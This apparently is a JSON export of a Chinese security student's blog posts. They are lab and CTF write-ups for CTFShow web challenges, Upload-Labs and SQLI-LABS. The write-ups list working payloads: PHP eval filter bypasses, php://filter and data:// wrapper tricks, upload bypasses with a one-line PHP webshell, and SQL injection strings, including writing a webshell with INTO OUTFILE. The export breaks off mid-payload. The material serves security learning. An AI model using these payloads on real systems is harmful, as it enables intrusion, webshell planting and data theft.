[{"id":"97c78e4c1ca12edfa682a28b2e497aaf","title":"CTFShow","content":"CTFShow\n信息收集web1开发注释未及时删除 \n直接查看源码，flag在注释里\nweb2js前台拦截 === 无效操作\n浏览器禁用js或则Burp抓包\nweb3f12 网络在响应头里就有flag或者直接抓包\nweb4robots.txt文件泄露\n直接查看robots.txt\nrobots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。\n常见的备份文件\n.index.php.swp\nindex.php.swp\nindex.php.bak\n.index.php~\nindex.php.bak_Edietplus\nindex.php.~\nindex.php.1\nindex.php\nindex.php~\nindex.php.rar\nindex.php.zip\nindex.php.7z\nindex.php.tar.gz\nwww.zip\nwww.rar\nwww.zip\nwww.7z\nwww.tar.gz\nwww.tar\nweb.zip\nweb.rar\nweb.zip\nweb.7z\nweb.tar.gz\nweb.tar\nwwwroot.rar\nweb.rar\n\nweb5phps文件泄露\nphps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取\nphp备份文件：后缀为php~或者index.php.bak\n\nphp的源代码文件：后缀为phps\n\nweb6源码压缩包泄露\n直接访问www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问\nweb7版本控制泄露源码\ngit / svn\n\n是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。\n访问 url/.git/ ，得到 flag 。\n.git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害\n类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。\nweb8.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）\n访问 url/.svn/ ，得到 flag 。\nSubversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。\nweb9vim临时文件泄露\n如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件同时多次意外退出并不会覆盖旧的.swp文件，而是会生成一个新的，例如**.swo**文件。\nvim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn\n直接访问index.php.swp\n一、vim备份文件\n\n     默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；\n\n    eg:index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~\n\n二、vim临时文件\n\n    vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件\n\n .submit.swp。如果文件正常退出，则此文件自动删除。\n\nweb10cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。\nweb11域名txt记录泄露\n域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag\nhttps://whois.chinaz.com/\nhttp://www.jsons.cn/nslookup/\nhttps://zijian.aliyun.com/\n\nweb12敏感信息公布\nurl/admin/访问后台需要登陆\n猜测用户名为admin，密码为页面最下方联系电话号码，登录成功\nweb13内部技术文档泄露\n在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag\nweb14编辑器配置不当\n进入url/editor/\n插入文件-&gt;文件空间\n随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt\n直接访问url+/nothinghere/fl000g.txt进入得到flag\nweb15密码逻辑脆弱\n进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag\nweb16探针泄露\n考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag\n\n访问/tz.php\n再点击进入phpinfo可以得到flag\nweb17备份SQL文件泄露\nbackup.sql\nweb18js敏感信息泄露\n直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag\nweb19前端密钥泄露\n直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag\nweb20mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}\nweb21CDN穿透\n确定 IP 的话，直接 ping 域名，得到 IP\n\n爆破web21tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com)\n抓包发现，随便输入的密码被base64编码，解码username:password\n对密码进行爆破，猜测用户名为admin:\n\n爆破时要进行base64加密以及关掉默认的url编码\n\n最后密码为shark63，获取flag\nweb22子域名爆破\n使用域名挖掘机\nweb23substr(string,start,length)\n\n\n打开就是一段代码，手动写一段脚本爆破\n&lt;!DOCTYPE html&gt;\n&lt;html lang='en'&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;?php    \n    for ($i = 0; $i &lt; 1000; $i = $i + 1) {\n        $token = md5($i);\n        if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) {\n            if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) {\n                echo $i;\n            }\n        }\n    }\n    ?&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n\nweb24mt_srand伪随机数\nmt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的\n\n&lt;?php\n        mt_srand(372619038);    \n        echo intval(mt_rand());\n?&gt;\n\nweb25mtrand()随机数生成漏洞\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n\n\n使用php_mt_seed - MT_RAND（）种子饼干 (openwall.com)爆破出种子\n\n最后可以得到，这三个mt_rand()的值都不一样\n&lt;?php\n        mt_srand(2414568491);    \n        echo mt_rand().\"\\n\";\n        echo mt_rand()+mt_rand();\n\n  ?&gt;\n\n然后通过burp发包获取flag\n\nweb26抓包后直接发包得到flag\n\nweb27爆破生日日期\n可以获取录取名单，得到姓名和缺少出生日期的身份证号码\n\n在查询页面发包\n\n抓取后进行爆破\n\n\n最后得到正确的日期\n\n登录获取flag\nweb28提示爆破目录\n通过暴力破解目录/0-100/0-100/看返回数据包\n爆破的时候去掉2.txt 仅仅爆破目录即可\n\n\n\n命令执行web29preg_match 执行一个正则表达式匹配\n\n&lt;?php\n//模式分隔符后的\"i\"标记这是一个大小写不敏感的搜索\nif (preg_match(\"/php/i\", \"PHP is the web scripting language of choice.\")) {\n    echo \"查找到匹配的字符串 php。\";\n} else {\n    echo \"未发现匹配的字符串 php。\";\n}\n?&gt;\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\n首先执行ls命令，利用system\n?c=system(ls);\n得到两个文件 flag.php和index.php\n用cat命令读取flag.php，因为过滤了flag所以使用通配符\n?c=system('cat fla*.php');\n?c=system(\"nl fla?????\");\n?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`;\n?c=echo `nl fl\\ag.php`;//转义字符绕过\n?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php\n?c=eval($_GET[1]);&amp;1=system('nl flag.php');\n?c=awk '{printf $0}' flag.php||\n?c=$a=\"fla\";$b=\"g.php\";echo%20file_get_contents($a.$b);\n\nlinux文件内容查看命令\ncat、tac、nl、more、less、head、tail、``\n\n通配符\n*可以通配多个字符\n?可以通配一个字符\n\nweb30过滤了flag、system、php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\n可以使用其他函数\nsystem()\npassthru()\nexec()\nshell_exec()\npopen()\nproc_open()\npcntl_exec()\n反引号 同shell_exec()\n\nc=echo exec('nl fla?????');\nc=echo `nl fla''g.p''hp`;\nc=echo `nl fla?????`;\n\nweb31error_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=eval($_GET[1]);&amp;1=system('nl flag.php');//只过滤了c，1可以继续使用空格\nc=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));\nc=show_source(next(array_reverse(scandir(pos(localeconv())))));\nc=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种\nc=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"nl%09fl[a]*\");等价于system()\nc=echo`strings%09f*`;\nc=echo`strings\\$IFS\\$9f*`必须加转义字符\n\nshow_source(next(array_reverse(scandir(pos(localeconv())))));\n\nscandir('.')这个函数的作用是扫描当前目录\nlocaleconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.\npos()/current()函数返回数组第一个值\narray_reverse()是将数组颠倒\nnext()将数组指针一项下一位\nshow_source()的意思是读取函数内容\n\nweb32if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=$nice=include$_GET[\"url\"]?&gt;&amp;url=php://filter/read=convert.base64-\nencode/resource=flag.php\n//include可以不用括号，后面直接跟变量不用空格，分号可以用?&gt;代替\n//利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。\n\ndata伪协议\n把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本\nc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\nc=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n\nweb33if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-\nencode/resource=flag.php\n\nc=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\n\nweb34if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nweb35同上\nweb36if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\nc=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php\n\nc=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt;\n\nweb37if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //&lt;?php system('cat flag.php');?&gt;\n\n/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;\n\n还可以配合UA头执行日志包含\nc=/var/log/nginx/access.log\n\nweb38if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n\n也可以日志包含\nc=/var/log/nginx/access.log\n\nweb39data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n/?c=data://text/plain,&lt;?php system('cat fla*');?&gt;\n??为什么base64不行\n\nweb40if(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n\n\nweb41web42web43web44web45web46web47web48web49web50web51web52web53web54web55web56web57web58web59web60","slug":"CTFShow","date":"2022-09-28T18:49:51.000Z","categories_index":"","tags_index":"CTF","author_index":"Yum1"},{"id":"6eaadfe5982cfed026ffa1786120cf60","title":"Upload-Labs","content":"Upload-Labs\nPass-011使用一句话木马，直接进行上传，发现php后缀被限制，修改为jpg后缀重新上传，上传成功。\n\n\n使用Burpsuite抓包\n\n将jpg后缀修改为php，发包\n\n就可以将php为后缀的文件上传到网站，使用蚁剑，复制图片地址\n\n2直接查看源码，发现就是js有一个checkFile()，将浏览器关闭js\n\n\n修改后就可以直接上传php文件，重复上述步骤\n源码\n就是对文件后缀做限制\nPass-02\n服务器MIME检测：即检测Content-Type的内容。\n绕过方法：修改类型为允许上传的类型即可。\n\n直接上传php文件，文件类型不正确，使用burpsuite抓包\n\n\n修改Content-Type为image/jpeg、image/png、image/gif\n\n上传成功\n源码就是对文件类型进行判断\n\nPass-03上传php文件\n\n基于黑名单检测：黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多。一般由个专门blacklist，里面包含常见的危险脚本文件。\n绕过办法：\n\n文件大小写让绕过（Php ，PhP pHp，等）\n\n黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php\n\n基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。\n基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。\n用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件，但可以上传.phtml、 .php3 .php5、php4、 .pht、php1、php2、phps【这些后缀会被当成php文件解析】等等。\n\n\n特殊文件名绕过\n\n修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格)由于这种命名格式在   windows系统里是不允许的，所以在绕过上传之后windows系统会自动去掉.点和空格。Linux和Unix中没有这个特性。\n::$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名)\n\n\n. .htaccess文件攻击（结合黑名单攻击）\n\n解析绕过\n\n\n\n使用双写绕过，因为会过滤::$DATA\n源码\nPass-04.htaccess是什么：\n全称是Hypertext Access(超文本入口) .htaccess文件也被成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。\n\n.htaccess功能：\n文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表\n很可惜，这么一个强大的功能默认是不开启的 Apache （有伪静态的都可以试试）\n\n用法：\nAddType application/x-httpd-php .jpg 这个指令代表着.jpg文件会当做php来解析\nSetHandler application/x-httpd-php，意思是把所有文件都解析为php文件来执行。\n\nPass-05Pass-06\nPass-07\nPass-08\nPass-09\nPass-10\nPass-11\nPass-12\nPass-13\nPass-14\nPass-15\nPass-16\nPass-17\nPass-18\nPass-20\nPass-21\n","slug":"Upload-Labs","date":"2022-09-28T18:49:40.000Z","categories_index":"","tags_index":"文件上传","author_index":"Yum1"},{"id":"5634edcd823c1dd1f0ab5cd6b943e9fb","title":"SQLI-LABS","content":"Less-1判断是否存在注入:\n?id=1' and 1=1 --+\n\n判断字段数:\n?id=1' order by 3--+\n\n判断显错位:\n?id=-1' union select 1,2,3--+\n\n判断库名:\n?id=-1' union select 1,database(),3--+\n\n判断表名:\n?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security'--+\n\n?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 3,1--+\n\n?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+\n//可能会因为显示位不全，显示错误\n\n判断列名:\n?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'--+\n\n?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='users'--+\n\n判断数据:\n?id=-1' union select 1,id,3 from emails--+\n\nLess-2类第一关\nLess-3(‘1’)\n判断是否存在注入:\n?id=1') and 1=1 --+\n下面类第一关\n\nLess-4$id = '\"' . $id . '\"';\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n\n判断是否存在注入:\n?id=1\") and 1=1 --+\n下面类第一关\n\nLess-5盲注&amp;报错注入\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n    if($row)\n    {\n      echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;';\t\n      echo 'You are in...........';\n      echo \"&lt;br&gt;\";\n        echo \"&lt;/font&gt;\";\n      }\n    else \n    {\n    \n    echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;';\n    print_r(mysql_error());\n    echo \"&lt;/br&gt;&lt;/font&gt;\";\t\n    echo '&lt;font color= \"#0000ff\" font size= 3&gt;';\t\n    \n    }\n}\n    else { echo \"Please input the ID as parameter with numeric value\";}\n\n判断是否存在注入:\n?id=1' and 1=1 --+\n\n判断字段数:\n?id=1' order by 3--+\n\n判断显错位:\n盲注没有显错位\n\n判断库名:\n?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x72),1)--+\n\n判断表名:\n?id=1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+\n\n判断列名:\n?id=1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+\n\n判断数据:\n?id=1' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+\n\nupdatexml() 更新xml文档的函数\n\n语法：updatexml(目标xml内容，xml文档路径，更新的内容)\n\nupdatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\n\n实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了\n\n但是报错的时候他其实已经执行了那个子查询代码！\n\n[0x7e实际是是16进制，Mysql支持16进制，但是开头得写0x 0x7e是一个特殊符号，然后不符合路径规则报错]~ ~\n\n添加一个不符合规则的符号进行报错，从而爆出子查询的内容：SELECT database()\n\nupdatexml ()这个函数一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数\n\neg:\nselect *from news where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n但是要注意，and情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or\n\n某些没有回显盲注也可以用这个updatexml()做出来。\n\n但是报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()。\n\nSELECT * FROM users union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1);\n\n1105 - XPATH syntax error: '~security~'\n\nLess-6判断是否存在注入:\n?id=1\" and 1=1 --+\n其他类题5\n\nLess-7outfile 向服务器写入文件\n\n在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：\n写\ninto dumpfile()//保留格式\ninto outfile()//原始数据\n读\nload_file()\n\nunion select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'c:/phpstudy/www/1.php'\n\n这些都是需要设置secure_file_priv=，如果他为空则可以指定任意目录，如果有设置等于某个路径就只能在这个指定路径下，而他为null时则禁止导入导出功能\n\n判断字段数:\n?id=1')) order by 3 --+\n\n写马:\n?id=1')) union select 1,\"&lt;?php eval($_REQUEST[1])?&gt;\",3 into outfile \"D:/AppData/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php\" --+\n\n访问一句话木马\nhttp://127.0.0.1:8090/Less-7/shell.php?1=phpinfo();\n\nLess-8盲注\n布尔型盲注:\nlength()函数 返回字符串长度\n\nsubstr() 截取字符串 (语法：SUBSTR(str,pos,len);)\n\nascii() 返回字符的ascii码 [将字符变为数字wei]\n\n时间型盲注:\nsleep()将程序挂起一段时间 n为n秒\n\nif(expr1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句\n\n拆解库名长度\n?id=1' and (length(database()))=8 --+\n\n利用ASCII码猜解当前数据库名称：\n?id=1' and (ascii(substr(database(),1,1)))=115 --+\n返回正常，说明数据库名称第一位是s\n\n?id=1' and (ascii(substr(database(),2,1)))=101 --+\n返回正常，说明数据库名称第二位是e\n\n猜表名:\n?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+\n如果返回正常，说明数据库表名的第一个的第一位是e\n\n猜字段名:\n?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105 --+\n如果返回正常，说明emails表中的列名称第一位是i\n\nLess-9同样按照盲注的手法，尝试后发现这里无论输入什么条件，回显的结果都是一个，这就证明不能再用刚刚布尔盲注的做法了，要尝试使用时间盲注\n布尔盲注页面会有两种状态\n时间盲注无论条件是什么都只返回一种页面\n猜解库名长度:\n?id=1' and if(length(database())=8,sleep(5),1) --+\n\n利用ASCII码猜解当前数据库名称:\n?id=1' and if((ascii(substr(database(),1,1))=115),sleep(5),1) --+\n延时，说明数据库名称第一位是s\n\n猜表名:\n?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),1) --+\n延时，说明数据库表名的第一个的第一位是e\n\n猜字段名:\n?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1) --+\n如果返回正常，说明emails表中的列名称第一位是i\n\nLess-10闭合方式有区别\n?id=1\" and if(length(database())=8,sleep(5),1) --+\n其他类题九\n\nLess-11POST传参\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n\n万能密码:\n' or 1=1 -- + //要有空格\n' or 1=1#\n\n判断字段数:\n' or 1=1 order by 2 -- +\n\n判断显错位:\n' union select 1,2#\n\n判断库名:\n' union select 1,database()#\n\n判断表名:\n?id=10' union select 1,table_name from information_schema.tables where table_schema='security'#\n\n判断列名:\n?id=10' union select 1,column_name from information_schema.columns where table_schema='security' and table_name ='users' limit 1,1#\n\n判断数据:\n?id=10' union select 1,username from users#\n\nLess-12闭合有区别，尝试万能密码\n\") or 1=1#\n\n其他类题十一\n\nLess-13post传参的报错注入\n判断是否存在注入:\n?id=1' and 1=1 -- qwe\n\n判断库名:\n')and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe\n\n判断表名：\n')and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe\n\n判断列名：\n')and updatexml(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe\n\n判断数据：\n')and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe\n\n类题五\n\nLess-14类题13\n\n判断库名：\n\"and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe\n\nLess-15POST盲注\nif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))\n{\n    $uname=$_POST['uname'];\n    $passwd=$_POST['passwd'];\n\n    //logging the connection parameters to a file for analysis.\n    $fp=fopen('result.txt','a');\n    fwrite($fp,'User Name:'.$uname);\n    fwrite($fp,'Password:'.$passwd.\"\\n\");\n    fclose($fp);\n\n\n    // connectivity \n    @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n    $result=mysql_query($sql);\n    $row = mysql_fetch_array($result);\n\n    if($row)\n    {\n          //echo '&lt;font color= \"#0000ff\"&gt;';\t\n          \n          echo \"&lt;br&gt;\";\n        echo '&lt;font color= \"#FFFF00\" font size = 4&gt;';\n        //echo \" You Have successfully logged in\\n\\n \" ;\n        echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;';\t\n        echo \"&lt;br&gt;\";\n        //echo 'Your Login name:'. $row['username'];\n        echo \"&lt;br&gt;\";\n        //echo 'Your Password:' .$row['password'];\n        echo \"&lt;br&gt;\";\n        echo \"&lt;/font&gt;\";\n        echo \"&lt;br&gt;\";\n        echo \"&lt;br&gt;\";\n        echo '&lt;img src=\"../images/flag.jpg\"  /&gt;';\t\n        \n          echo \"&lt;/font&gt;\";\n      }\n    else  \n    {\n        echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;';\n        //echo \"Try again looser\";\n        //print_r(mysql_error());\n        echo \"&lt;/br&gt;\";\n        echo \"&lt;/br&gt;\";\n        echo \"&lt;/br&gt;\";\n        echo '&lt;img src=\"../images/slap.jpg\"   /&gt;';\t\n        echo \"&lt;/font&gt;\";  \n    }\n}\n\n猜解库名长度:\n' or (length(database()))=8 #\n\n利用ASCII码猜解当前数据库名称:\n' or (ascii(substr(database(),1,1)))=115#\n返回正常，说明数据库名称第一位是s\n\n' or (ascii(substr(database(),2,1)))=101#\n返回正常，说明数据库名称第二位是e\n\n猜表名:\n' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101#\n如果返回正常，说明数据库表名的第一个的第一位是e\n\n猜字段名:\n'or (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105#\n如果返回正常，说明emails表中的列名称第一位是i\n\nLess-16$uname='\"'.$uname.'\"';\n$passwd='\"'.$passwd.'\"'; \n\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n\n类题15\n闭合区别\n\") or (length(database()))=8 #\n\nLess-17密码重置，所以从下面的password入手，使用报错注入\n判断是否存在注入:\n' or 1=1 -- +\n\n判断库名:\n' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+\n\n判断表名:\n' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+\n\n判断列名:\n' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+\n\n判断数据:\n' and updatexml(1,concat(0x7e,(SELECT id from users limit 